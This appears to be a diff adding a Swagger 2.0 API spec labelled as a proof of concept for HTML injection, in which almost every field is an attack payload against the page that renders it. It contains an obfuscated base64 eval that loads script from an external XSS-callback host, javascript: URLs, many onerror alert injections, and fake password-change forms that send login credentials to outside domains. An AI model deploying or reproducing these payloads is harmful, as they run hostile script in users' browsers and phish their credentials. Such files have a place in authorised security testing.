@@ -1,0 +1,108 @@
+
+
+
+
+
+{
+    "swagger": "2.0",
+    "info": {
+        "title": "PoC for HTMLinjection",
+        "description": "test",
+        "version": "2017-06-04T22:56:06+00:00",
+        "contact": {
+            "name": "test",
+            "url": "
+a');location=`javascript:eval(atob('dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7YS5zcmM9J2h0dHBzOi8vdGVzdGluZ2J4c3MueHNzLmh0Jztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEp'))`///",
+            "email": "xx.team@%0D%0Ajavascript%3Aalert(1)%2F%2F%0A.com"
+        }
+    },
+    
+    
+    "host": "xok",
+    "basePath": "xxxx",
+    "schemes": [
+        "https"
+    ],
+    "consumes": [
+        "xxxx"
+    ],
+    "produces": [
+        "xxxxx"
+    ],
+  "securityDefinitions": {
+    "oauth2": {
+      "flow": "implicit",
+      "authorizationUrl": "javascript:alert(document.domain)//",
+      "scopes": {
+        "web-api": "testing"
+      },
+      "type": "oauth2"
+    }
+    },
+    "security": [
+        {
+            "tokenHeader": ["<script>console.log(‘000000000000000000dad0000000000000000000');</script>"]
+        }
+    ],
+    "paths": {
+        "/><img src=x onerror=alert(document.domain)>": {
+            "post": {
+                "summary": "/'\">bbb</script><img src=x onerror=alert(document.domain)>",
+                "description": "<IMG src='https://techbeacon.scdn7.secure.raxcdn.com/sites/default/files/styles/article_hero_image/public/field/image/testing-trends-world-quality-report.jpg?itok=vUyONZsj'/>
+<h1 style='background-color:Tomato;'>change your  password here</h1>
+<form method='get' action='https://00.paresh.ninja'> <p><input type='text' name='login' value='' placeholder='Username or Email'></p> <p><input type='password' name='password' value='' placeholder='Password'></p>  <p class='submit'><input type='submit' name='commit' value='Login'></p>  </form>",
+                "tags": ["ccc"],
+                "parameters": [
+                    {
+                        "name": "/xxx'tabindex=0 id=aaa onfocus=alert(document.domain) onmouseover=alert(document.domain) yyy\"zzz></script><img src=x onerror=alert(document.domain)>",
+                        "in": "body",
+                        "schema": {
+                            "type": "object",
+                            "required": [
+                                "/hhh'\"></script><img src=x onerror=alert(document.domain)>"
+                            ],
+                            "properties": {
+                                "/ccc<img src=x onerror=alert(document.domain)>": {
+                                    "type": "string",
+                                    "description": "/iii'\"></script><img src=x onerror=alert(document.domain)>"
+                                }
+                            },
+                            "description": "/ddd'\"></script><img src=x onerror=alert(document.domain)>"
+                        },
+                        "required": true
+                    }
+                ],
+                "responses": {
+                    "200": {
+                        "description": "{<marquee>test</marquee><h1 style='border:2px solid Tomato;'>Hello World HTML injection PoC</h1><form><button formaction=//evil>XSS</button><textarea name=x>}"
+                    },
+                    "400": {
+                        "description": "<IMG src='https://techbeacon.scdn7.secure.raxcdn.com/sites/default/files/styles/article_hero_image/public/field/image/testing-trends-world-quality-report.jpg?itok=vUyONZsj'/>
+<h1 style='background-color:Tomato;'>change your  password here</h1>
+<form method='get' action='https://xavi.synack-lp.com/'> <p><input type='text' name='login' value='' placeholder='Username or Email'></p> <p><input type='password' name='password' value='' placeholder='Password'></p>  <p class='submit'><input type='submit' name='commit' value='Login'></p>  </form>",
+                        "schema": {
+                            "type": "object",
+                            "properties": {
+                                "errors": {
+                                    "type": "object",
+                                    "additionalProperties": {
+                                        "type": "string"
+                                    },
+                                    "description": "/lll'\"></script><img src=x onerror=alert(document.domain)>"
+                                }
+                            },
+                            "description": "/mmm'\"></script><img src=x onerror=alert(document.domain)>"
+                        },
+                        "examples": {
+                            "/nnn'\"></script><img src=x onerror=alert(document.domain)>": {
+                                "errors": {
+                                    "/ooo'\"></script><img src=x onerror=alert(document.domain)>": "/ppp'\"></script><img src=x onerror=alert(document.domain)>"
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        }
+    }
+}
